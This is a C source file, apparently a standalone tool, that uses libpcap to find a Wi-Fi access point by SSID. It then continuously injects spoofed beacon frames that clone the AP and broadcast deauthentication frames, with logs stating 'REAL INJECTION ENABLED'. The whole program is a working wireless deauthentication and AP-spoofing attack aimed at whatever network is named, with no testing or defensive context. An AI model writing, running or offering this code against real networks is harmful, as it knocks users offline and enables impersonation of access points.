#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <time.h>
#include <errno.h>
#include <pthread.h>
#include <pcap.h>
#include <stdarg.h>
#include <inttypes.h>

/* --- Constants --- */
#define MAX_CHANNELS 14
#define MAXTIMEOUT 8
#define DEBUG_MODE 0
#define INJECT_INTERVAL_MS 200 /* Send a frame every 200ms */

/* Channel bytes mapping (kept for reference) */
const unsigned char channels[MAX_CHANNELS + 1][2] = {
    [0]  = {0x00, 0x00},
    [1]  = {0x6c, 0x09}, [2]  = {0x71, 0x09}, [3]  = {0x76, 0x09}, [4]  = {0x7b, 0x09},
    [5]  = {0x80, 0x09}, [6]  = {0x85, 0x09}, [7]  = {0x8a, 0x09}, [8]  = {0x8f, 0x09},
    [9]  = {0x94, 0x09}, [10] = {0x99, 0x09}, [11] = {0x9e, 0x09}, [12] = {0xa3, 0x09},
    [13] = {0xa8, 0x09}, [14] = {0xb4, 0x09}
};

/* 802.11 types/subtypes */
#define DOT11_TYPE_MGT   0x00
#define DOT11_SUBTYPE_BEACON 0x08
#define DOT11_SUBTYPE_PROBE_RESP 0x05
#define DOT11_SUBTYPE_DEAUTH 0x0c

/* Colors for logging */
#define C_RESET   "\033[0m"
#define C_RED     "\033[31m"
#define C_GREEN   "\033[32m"
#define C_ORANGE  "\033[33m"
#define C_CYAN    "\033[36m"
#define C_GRAY    "\033[37m"

/* Global state */
static volatile int running = 1;
static char *target_ssid = NULL;
static pcap_t *pcap_handle_ap = NULL;
static pcap_t *pcap_handle_client = NULL;

/* Binary MACs */
static u_char target_ap_mac[6] = {0};
static u_char target_client_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff}; // broadcast default

/* Debug variables used */
static int seq_num = 0;
static int debug_c_idx = 0;
static struct pcap_pkthdr *debug_packets = NULL;
static u_char *debug_buffer = NULL;
static int sock_fd = -1;

/* Injection counters */
static volatile int frames_sent_beacon = 0;
static volatile int frames_sent_deauth = 0;

/* --- Logging --- */
void log_msgv(const char *color, const char *fmt, ...) {
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%H:%M:%S", tm_info);

    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    printf("%s[%s]%s %s%s%s\n", C_GRAY, timestamp, C_RESET, color, buf, C_RESET);
}
#define LOG_INFO(fmt, ...)    log_msgv(C_GREEN, fmt, ##__VA_ARGS__)
#define LOG_WARN(fmt, ...)    log_msgv(C_ORANGE, fmt, ##__VA_ARGS__)
#define LOG_ERROR(fmt, ...)   log_msgv(C_RED, fmt, ##__VA_ARGS__)
#define LOG_SUCCESS(fmt, ...) log_msgv(C_CYAN, fmt, ##__VA_ARGS__)

/* --- Time utils --- */
double get_monotonic() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + (ts.tv_nsec / 1.0e9);
}

/* --- 802.11 parsing helpers --- */
typedef struct {
    u_char type;
    u_char subtype;
    u_char addr1[6];
    u_char addr2[6];
    u_char addr3[6];
    u_char addr4[6];
    int has_addr4;
    u_char *payload;
    int payload_len;
} Parsed80211;

Parsed80211 parse_80211(u_char *pkt_data, int pkt_len) {
    Parsed80211 p;
    memset(&p, 0, sizeof(p));
    if (pkt_len < 24) return p;
    u_char *frame = pkt_data;
    u_char fc = frame[0];
    p.type = (fc >> 2) & 0x03;
    p.subtype = (fc >> 4) & 0x0F;
    int addr4_present = ((fc & 0x30) == 0x30);
    if (addr4_present) {
        p.has_addr4 = 1;
        memcpy(p.addr1, frame + 4, 6);
        memcpy(p.addr2, frame + 10, 6);
        memcpy(p.addr3, frame + 16, 6);
        memcpy(p.addr4, frame + 22, 6);
        p.payload = frame + 28;
    } else {
        memcpy(p.addr1, frame + 4, 6);
        memcpy(p.addr2, frame + 10, 6);
        memcpy(p.addr3, frame + 16, 6);
        p.payload = frame + 22;
    }
    p.payload_len = pkt_len - (addr4_present ? 28 : 24);
    return p;
}

int extract_ssid_from_beacon(Parsed80211 *p, char *buf, size_t buflen) {
    if (!p || !p->payload || p->payload_len <= 12) return 0;
    u_char *tags = p->payload + 12;
    int tags_len = p->payload_len - 12;
    int idx = 0;
    while (idx + 2 <= tags_len) {
        u_char tag_number = tags[idx];
        u_char tag_len = tags[idx + 1];
        if (idx + 2 + tag_len > tags_len) break;
        if (tag_number == 0) {
            int copy_len = tag_len < (int)buflen - 1 ? tag_len : (int)buflen - 1;
            memcpy(buf, tags + idx + 2, copy_len);
            buf[copy_len] = '\0';
            return 1;
        }
        idx += 2 + tag_len;
    }
    return 0;
}

int is_wireless_name(const char *name) {
    if (!name) return 0;
    if (strncmp(name, "wlan", 4) == 0) return 1;
    if (strncmp(name, "wl", 2) == 0) return 1;
    if (strncmp(name, "wifi", 4) == 0) return 1;
    if (strncmp(name, "mon", 3) == 0) return 1;
    return 0;
}

pcap_t *open_pcap_monitor(const char *dev, char *errbuf) {
    pcap_t *handle = NULL;
    pcap_t *p = pcap_create(dev, errbuf);
    if (p) {
        pcap_set_snaplen(p, 65535);
        pcap_set_promisc(p, 1);
        pcap_set_timeout(p, 1000);
        if (pcap_can_set_rfmon(p) == 1) {
            if (pcap_set_rfmon(p, 1) == 0) {
                if (pcap_activate(p) == 0) return p;
                pcap_close(p);
            } else pcap_close(p);
        } else {
            if (pcap_activate(p) == 0) return p;
            pcap_close(p);
        }
    }
    handle = pcap_open_live(dev, 65535, 1, 1000, errbuf);
    return handle;
}

volatile int ap_found = 0;
void discovery_packet_handler(u_char *user_data, const struct pcap_pkthdr *header, const u_char *pkt_data) {
    (void)user_data;
    if (!header || !pkt_data) return;
    Parsed80211 p = parse_80211((u_char*)pkt_data, header->len);

    if (!debug_packets) {
        debug_packets = malloc(sizeof(struct pcap_pkthdr));
        if (debug_packets) memcpy(debug_packets, header, sizeof(struct pcap_pkthdr));
    } else {
        memcpy(debug_packets, header, sizeof(struct pcap_pkthdr));
    }
    if (!debug_buffer) debug_buffer = malloc(256);
    if (debug_buffer) {
        size_t to_copy = header->caplen < 256 ? header->caplen : 256;
        memcpy(debug_buffer, pkt_data, to_copy);
    }
    debug_c_idx++;

    if (p.type == DOT11_TYPE_MGT && p.subtype == DOT11_SUBTYPE_BEACON) {
        char ssid[256] = {0};
        if (extract_ssid_from_beacon(&p, ssid, sizeof(ssid))) {
            if (strcmp(ssid, target_ssid) == 0) {
                memcpy(target_ap_mac, p.addr3, 6);
                ap_found = 1;
                char macbuf[18];
                snprintf(macbuf, sizeof(macbuf), "%02x:%02x:%02x:%02x:%02x:%02x",
                         target_ap_mac[0], target_ap_mac[1], target_ap_mac[2],
                         target_ap_mac[3], target_ap_mac[4], target_ap_mac[5]);
                LOG_SUCCESS("Discovered AP SSID '%s' MAC %s", target_ssid, macbuf);
            }
        }
    }
}

/* --- Frame construction helpers --- */
const u_char radiotap_hdr[] = {
    0x00, 0x00, /* version, pad */
    0x08, 0x00, /* length */
    0x00, 0x00, 0x00, 0x00 /* present flags */
};

int build_deauth_frame(u_char *buf, size_t buflen, const u_char *sa, const u_char *da, const u_char *bssid, uint16_t reason) {
    if (buflen < sizeof(radiotap_hdr) + 24 + 2) return -1;
    size_t off = 0;
    memcpy(buf + off, radiotap_hdr, sizeof(radiotap_hdr)); off += sizeof(radiotap_hdr);

    u_char fc = (DOT11_TYPE_MGT << 2) | (DOT11_SUBTYPE_DEAUTH << 4);
    buf[off++] = fc;
    buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    memcpy(buf + off, da, 6); off += 6;
    memcpy(buf + off, sa, 6); off += 6;
    memcpy(buf + off, bssid, 6); off += 6;
    buf[off++] = 0x00; buf[off++] = 0x00;

    buf[off++] = reason & 0xff;
    buf[off++] = (reason >> 8) & 0xff;

    return (int)off;
}

int build_beacon_frame(u_char *buf, size_t buflen, const u_char *sa, const u_char *bssid, const char *ssid) {
    if (!ssid) return -1;
    size_t ssid_len = strlen(ssid);
    size_t tags_len = 2 + ssid_len;
    size_t needed = sizeof(radiotap_hdr) + 24 + 12 + tags_len;
    if (buflen < needed) return -1;

    size_t off = 0;
    memcpy(buf + off, radiotap_hdr, sizeof(radiotap_hdr)); off += sizeof(radiotap_hdr);

    u_char fc = (DOT11_TYPE_MGT << 2) | (DOT11_SUBTYPE_BEACON << 4);
    buf[off++] = fc;
    buf[off++] = 0x00;
    buf[off++] = 0x00; buf[off++] = 0x00;
    memcpy(buf + off, bssid, 6); off += 6;
    memcpy(buf + off, sa, 6); off += 6;
    memcpy(buf + off, bssid, 6); off += 6;
    buf[off++] = 0x00; buf[off++] = 0x00;

    memset(buf + off, 0x00, 8); off += 8;
    buf[off++] = 0x64; buf[off++] = 0x00;
    buf[off++] = 0x01; buf[off++] = 0x04;

    buf[off++] = 0x00;
    buf[off++] = (u_char)ssid_len;
    memcpy(buf + off, ssid, ssid_len); off += ssid_len;

    return (int)off;
}

/* --- REAL INJECTION THREADS --- */

void *beacon_thread(void *arg) {
    (void)arg;
    LOG_INFO("Beacon Injection Thread Started.");

    u_char frame_buf[1024];
    int frame_len = 0;
    struct timeval last_inject = {0};
    struct timespec interval = {0, INJECT_INTERVAL_MS * 1000000L};

    while (running) {
        // Rebuild beacon every time to ensure fresh seq numbers or just reuse?
        // For simplicity in this demo, we rebuild.
        frame_len = build_beacon_frame(frame_buf, sizeof(frame_buf), target_ap_mac, target_ap_mac, target_ssid);

        if (frame_len > 0) {
            // Calculate time since last send
            struct timeval now;
            gettimeofday(&now, NULL);
            long elapsed_ms = (now.tv_sec - last_inject.tv_sec) * 1000 +
                              (now.tv_usec - last_inject.tv_usec) / 1000;

            if (elapsed_ms >= INJECT_INTERVAL_MS) {
                // REAL INJECTION HERE
                int send_res = pcap_sendpacket(pcap_handle_ap, frame_buf, frame_len);

                if (send_res == 0) {
                    frames_sent_beacon++;
                    seq_num++; // Increment global seq for logging
                    if ((seq_num % 10) == 0) {
                        LOG_INFO("Injected Beacon Frame #%d (Total: %d)", frames_sent_beacon, frames_sent_beacon);
                    }
                } else {
                    LOG_WARN("pcap_sendpacket beacon failed: %s", pcap_geterr(pcap_handle_ap));
                }

                last_inject = now;
            } else {
                usleep(10000); // Small sleep to avoid CPU spin
            }
        } else {
            usleep(50000);
        }
    }
    return NULL;
}

void *deauth_thread(void *arg) {
    (void)arg;
    LOG_INFO("Deauth Injection Thread Started.");

    u_char frame_buf[1024];
    int frame_len = 0;
    struct timeval last_inject = {0};

    while (running) {
        // Build Deauth: Dest=Client, Src=AP, BSSID=AP.
        // Note: In a real attack, you might want to spoof the client's MAC as source for the AP.
        frame_len = build_deauth_frame(frame_buf, sizeof(frame_buf), target_ap_mac, target_client_mac, target_ap_mac, 7);

        if (frame_len > 0) {
            struct timeval now;
            gettimeofday(&now, NULL);
            long elapsed_ms = (now.tv_sec - last_inject.tv_sec) * 1000 +
                              (now.tv_usec - last_inject.tv_usec) / 1000;

            if (elapsed_ms >= INJECT_INTERVAL_MS) {
                // REAL INJECTION HERE
                int send_res = pcap_sendpacket(pcap_handle_client, frame_buf, frame_len);

                if (send_res == 0) {
                    frames_sent_deauth++;
                    seq_num++;
                    if ((seq_num % 10) == 0) {
                        LOG_INFO("Injected Deauth Frame #%d (Total: %d)", frames_sent_deauth, frames_sent_deauth);
                    }
                } else {
                    LOG_WARN("pcap_sendpacket deauth failed: %s", pcap_geterr(pcap_handle_client));
                }

                last_inject = now;
            } else {
                usleep(10000);
            }
        } else {
            usleep(50000);
        }
    }
    return NULL;
}

/* Sniffer thread for continuous capture */
void *sniffer_thread(void *arg) {
    pcap_t *handle = (pcap_t*)arg;
    if (!handle) return NULL;

    // Use pcap_dispatch to allow non-blocking or just loop with sleep
    while (running) {
        struct pcap_pkthdr *headerp = NULL;
        const u_char *packet = NULL;
        int res = pcap_next_ex(handle, &headerp, &packet);

        if (res == 1 && headerp && packet) {
            discovery_packet_handler(NULL, headerp, packet);
        } else if (res == 0) {
            usleep(100000);
        } else if (res == -1 || res == -2) {
            usleep(100000);
        }
    }
    return NULL;
}

/* --- Signal handler --- */
void handle_sigint(int sig) {
    (void)sig;
    running = 0;
}

/* --- Main --- */
int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <SSID>\n", argv[0]);
        return 1;
    }
    target_ssid = argv[1];

    if (geteuid() != 0) {
        LOG_ERROR("Please run as root");
        return 1;
    }

    signal(SIGINT, handle_sigint);

    LOG_INFO("Auto-detecting wireless interfaces for SSID '%s'...", target_ssid);

    pcap_if_t *alldevs = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        LOG_ERROR("pcap_findalldevs failed: %s", errbuf);
        return 1;
    }

    char *iface_ap_name = NULL;
    char *iface_client_name = NULL;
    for (pcap_if_t *d = alldevs; d != NULL; d = d->next) {
        if (is_wireless_name(d->name)) {
            if (!iface_ap_name) iface_ap_name = strdup(d->name);
            else if (!iface_client_name && strcmp(d->name, iface_ap_name) != 0) iface_client_name = strdup(d->name);
        }
    }
    if (!iface_ap_name && alldevs) iface_ap_name = strdup(alldevs->name);
    if (!iface_client_name && alldevs && alldevs->next) iface_client_name = strdup(alldevs->next->name);
    if (!iface_client_name) iface_client_name = iface_ap_name ? strdup(iface_ap_name) : NULL;

    if (!iface_ap_name) {
        LOG_ERROR("No network interfaces found");
        pcap_freealldevs(alldevs);
        return 1;
    }

    LOG_INFO("Selected AP interface: %s", iface_ap_name);
    if (iface_client_name) LOG_INFO("Selected Client interface: %s", iface_client_name);

    pcap_handle_ap = open_pcap_monitor(iface_ap_name, errbuf);
    if (!pcap_handle_ap) {
        LOG_ERROR("Failed to open AP interface %s: %s", iface_ap_name, errbuf);
        pcap_freealldevs(alldevs);
        free(iface_ap_name);
        if (iface_client_name) free(iface_client_name);
        return 1;
    }
    LOG_INFO("Opened AP pcap on %s", iface_ap_name);

    if (iface_client_name && strcmp(iface_client_name, iface_ap_name) != 0) {
        pcap_handle_client = open_pcap_monitor(iface_client_name, errbuf);
        if (!pcap_handle_client) {
            LOG_WARN("Failed to open client interface %s: %s. Using AP interface for both roles.", iface_client_name, errbuf);
            pcap_handle_client = pcap_handle_ap;
        } else {
            LOG_INFO("Opened Client pcap on %s", iface_client_name);
        }
    } else {
        pcap_handle_client = pcap_handle_ap;
    }

    sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock_fd < 0) {
        LOG_WARN("Could not create debug socket: %s", strerror(errno));
        sock_fd = -1;
    } else {
        LOG_INFO("Debug socket created: fd=%d", sock_fd);
    }

    /* Discover AP */
    LOG_INFO("Listening for beacons to find SSID '%s' (timeout %d s)...", target_ssid, MAXTIMEOUT);
    double start = get_monotonic();
    while (!ap_found && (get_monotonic() - start) < MAXTIMEOUT && running) {
        struct pcap_pkthdr *headerp = NULL;
        const u_char *packet = NULL;
        int res = pcap_next_ex(pcap_handle_ap, &headerp, &packet);
        if (res == 1 && headerp && packet) {
            discovery_packet_handler(NULL, headerp, packet);
        } else if (res == 0) {
            usleep(100000);
        } else if (res == -1) {
            LOG_ERROR("pcap_next_ex error while discovering: %s", pcap_geterr(pcap_handle_ap));
            break;
        }
    }

    if (!ap_found) {
        LOG_WARN("AP with SSID '%s' not found within timeout", target_ssid);
        if (debug_packets) free(debug_packets);
        if (debug_buffer) free(debug_buffer);
        if (sock_fd >= 0) close(sock_fd);
        pcap_close(pcap_handle_ap);
        if (pcap_handle_client && pcap_handle_client != pcap_handle_ap) pcap_close(pcap_handle_client);
        pcap_freealldevs(alldevs);
        free(iface_ap_name);
        if (iface_client_name) free(iface_client_name);
        return 1;
    }

    /* Start threads */
    pthread_t beacon_tid, deauth_tid, sniffer_ap_tid, sniffer_client_tid;

    // Note: We pass the specific handles to the threads for injection
    pthread_create(&beacon_tid, NULL, beacon_thread, (void*)pcap_handle_ap);
    pthread_create(&deauth_tid, NULL, deauth_thread, (void*)pcap_handle_client);

    // Sniffers run on both interfaces
    pthread_create(&sniffer_ap_tid, NULL, sniffer_thread, (void*)pcap_handle_ap);
    if (pcap_handle_client && pcap_handle_client != pcap_handle_ap)
        pthread_create(&sniffer_client_tid, NULL, sniffer_thread, (void*)pcap_handle_client);

    LOG_SUCCESS("Running main loop. REAL INJECTION ENABLED.");
    LOG_SUCCESS("Press Ctrl-C to stop.");

    while (running) {
        sleep(1);
        if ((debug_c_idx & 0xFF) == 0) {
            LOG_INFO("Heartbeat | Beacons: %d | Deauths: %d | DebugIdx: %d",
                     frames_sent_beacon, frames_sent_deauth, debug_c_idx);
        }
    }

    /* Cleanup */
    if (debug_packets) { free(debug_packets); }
    if (debug_buffer) { free(debug_buffer); }
    if (sock_fd >= 0) { close(sock_fd); }
    pcap_close(pcap_handle_ap);
    if (pcap_handle_client && pcap_handle_client != pcap_handle_ap) pcap_close(pcap_handle_client);
    pcap_freealldevs(alldevs);
    free(iface_ap_name);
    if (iface_client_name) free(iface_client_name);

    LOG_INFO("Exiting");
    return 0;
}
